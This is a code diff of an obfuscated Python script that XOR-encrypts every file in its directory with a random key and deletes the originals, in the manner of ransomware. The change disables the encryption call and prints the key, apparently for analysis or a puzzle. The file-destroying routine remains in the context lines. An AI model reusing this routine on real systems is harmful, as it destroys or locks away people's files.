@@ -8,8 +8,12 @@ def xx(x):
   z.write((lambda x:bytes([x[i]^k[i%16] for i in range(len(x))]))(open(x,'rb').read()))
  os.remove(x)
 _,_,x = next(os.walk('./'));x.remove(argv[0]);y='\x2e'
-r=os.urandom;k=r(16);list(map(xx,x))
+r=os.urandom;k=r(16);
+# list(map(xx,x))
+print("k usada", k)
 d,k=map(lambda x:int.from_bytes(k,'big'),[0xba,0xbe])
+
+
 d|=1;y+='\x78';c=r(1)[0]|(1<<7);k=d*k%(1<<c)
 d,k=map(lambda x:x.to_bytes(32,'big'),[d,k])
 c=bytes([c]);y+='\x79\x7a'
